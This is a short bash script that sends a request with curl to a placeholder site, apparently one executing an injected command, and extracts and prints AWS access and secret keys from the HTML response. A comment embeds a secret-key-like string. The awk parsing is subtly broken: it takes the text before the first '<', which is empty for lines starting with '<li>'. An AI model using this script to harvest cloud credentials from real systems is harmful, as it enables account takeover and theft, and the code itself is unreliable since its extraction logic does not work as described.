#!/bin/bash

# Send the command to the server
response=$(curl <site>)

# Parse each AWS credential from the stdout
# Assuming the structure of the line is similar to: <li>Access Key: AKIA...</li>
AWS_ACCESS_KEY_ID=$(echo "$response" | grep 'Access Key:' | awk -F'<' '{print $1}' | awk -F': ' '{print $2}')

# Assuming the structure of the line is similar to: <li>Secret Key: paVI8VgTWkPI3jDNkdzUMvK4CcdXO2T7sePX0ddF</li>
AWS_SECRET_ACCESS_KEY=$(echo "$response" | grep 'Secret Key:' | awk -F'<' '{print $1}' | awk -F': ' '{print $2}')

echo "AWS_SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY"
echo "AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID"
